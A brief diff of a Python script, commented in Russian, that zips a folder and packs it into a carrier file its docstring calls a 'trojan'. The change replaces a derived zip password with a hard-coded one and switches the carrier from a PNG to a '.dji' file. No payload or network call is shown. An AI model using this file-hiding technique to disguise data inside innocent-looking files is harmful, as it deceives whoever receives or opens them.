@@ -17,12 +17,9 @@ result_path - путь, в котором появится троян"""
             zf.write(os.path.join(dirname, filename),
                      arcname=os.path.join(dirname, filename).split("/")[-1].replace('\\',
                                                                                     '/'))
-    img = Image.open(image_path)
-    x, y = img.size
-    img.close()
 
     # Придумать пароль
-    zf.setpassword(f"{x}{image_path.split('/')[-1]}{y}".encode("utf-8"))
+    zf.setpassword(b"poma_loh")
     zf.close()
 
     with open("data.zip", "rb") as zip_:
@@ -47,4 +44,4 @@ file_path - необходимый файл в трояне'''
 
 
 
-encrypt_files('video_background.png', 'data', 'res.png')
+encrypt_files('data.dji', 'data', 'res.dji')
